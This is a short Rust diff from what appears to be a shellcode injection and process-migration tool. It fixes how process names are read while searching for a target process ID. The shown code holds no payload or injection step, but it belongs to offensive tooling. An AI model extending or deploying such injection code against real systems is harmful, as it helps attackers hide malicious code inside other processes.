@@ -33,7 +33,7 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
             if element == 0 {
                 break;
             }
-            process_name.push(element as char);
+            process_name.push(element as u8 as char);
         }
         if process_name.contains(target_process) {
             pid = process_entry.th32ProcessID;
